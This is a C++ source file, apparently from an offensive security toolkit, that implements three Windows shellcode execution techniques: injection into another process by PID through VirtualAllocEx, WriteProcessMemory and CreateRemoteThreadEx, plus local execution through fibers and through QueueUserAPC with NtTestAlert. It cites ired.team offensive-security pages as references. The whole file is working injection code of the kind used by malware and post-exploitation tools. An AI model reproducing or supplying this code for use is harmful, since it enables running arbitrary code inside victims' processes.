#include "core/technique.hpp"

namespace Technique::Injection
{
    BOOL ShellcodeInjection(DWORD dwPID, const std::vector<BYTE>& shellcode)
    {
        HANDLE hProcess;
        HANDLE hThread;
        PVOID remoteBuffer;
        BOOL bResults;

        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
        if (!hProcess)
        {
            return FALSE;
        }

        remoteBuffer = VirtualAllocEx(
            hProcess,
            NULL,
            shellcode.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!remoteBuffer)
        {
            CloseHandle(hProcess);
            return FALSE;
        }

        if (!WriteProcessMemory(
            hProcess,
            remoteBuffer,
            shellcode.data(),
            shellcode.size(),
            NULL
        )) {
            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return FALSE;
        }

        hThread = CreateRemoteThreadEx(
            hProcess,
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)remoteBuffer,
            NULL,
            0,
            NULL,
            NULL
        );
        if (!hThread)
        {
            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return FALSE;
        }

        WaitForSingleObject(hThread, INFINITE);

        CloseHandle(hProcess);
        CloseHandle(hThread);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
    BOOL ShellcodeExecutionViaFibers(const std::vector<BYTE>& shellcode)
    {
        // Convert the current thread into a fiber.
        PVOID mainFiber = ConvertThreadToFiber(NULL);

        LPVOID scAddr = VirtualAlloc(
            NULL,
            shellcode.size(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        memcpy(scAddr, shellcode.data(), shellcode.size());

        PVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)scAddr, NULL);
        SwitchToFiber(scFiber);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert
    BOOL ShellcodeExecutionViaAPCAndNtTestAlert(const std::vector<BYTE>& shellcode)
    {
        using MY_NTSTATUS = NTSTATUS(NTAPI*)();

        MY_NTSTATUS testAlert = (MY_NTSTATUS)(GetProcAddress(
            GetModuleHandleA("ntdll"),
            "NtTestAlert"
        ));

        LPVOID scAddr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(GetCurrentProcess(), scAddr, shellcode.data(), shellcode.size(), NULL);

        PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)scAddr;
        QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), 0);
        testAlert();

        return TRUE;
    }
}